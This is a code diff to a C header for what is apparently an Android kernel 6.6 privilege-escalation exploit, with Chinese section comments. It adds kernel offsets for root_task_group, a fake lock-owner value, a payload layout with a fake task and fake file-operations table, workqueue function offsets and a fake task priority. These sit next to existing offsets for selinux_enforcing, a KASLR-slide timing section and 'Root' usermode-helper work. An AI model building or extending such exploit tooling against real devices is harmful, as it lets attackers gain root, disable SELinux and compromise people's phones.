@@ -60,6 +60,7 @@
 #define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
 #define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
 #define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
+#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
 
 // ===== SLIDE 参数 =====
 #define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
@@ -79,6 +80,17 @@
 #define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
 #define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
 #define SLIDE_KSNITCH_AVERAGE 8
+
+#define SLIDE_LOCK_OWNER_VALUE 0xffffffc000000001ULL
+
+// ===== Payload 布局偏移 =====
+#define LOCK_OFF 0x000
+#define W0_OFF 0x100
+#define FAKE_TASK_OFF 0x200
+#define FOPS_OFF 0x300
+#define FOPS_TABLE_OFF FOPS_OFF
+#define SCRATCH_OFF 0x800
+#define LEFT_OFF 0xa00
 
 // ===== 文件操作偏移 (Kernel 6.6) =====
 #define FOPS_OWNER_OFF 0x00
@@ -119,6 +131,7 @@
 #define PWQ_NR_IN_FLIGHT_OFF 0x50
 #define WORK_ENTRY_OFF 0x00
 #define WORK_DATA_OFF 0x20
+#define WORK_FUNC_OFF 0x18
 
 // ===== Root 相关 =====
 #define ROOT_UMH_WORK_OFF 0x100
@@ -127,6 +140,7 @@
 
 // ===== 其他 =====
 #define BUILD_VARIANT_LABEL "user"
+#define FAKE_TASK_PRIO 0x78
 
 // ===== Fake Waiter 偏移 =====
 #define FAKE_WAITER_TREE_PRIO_OFF 0x18
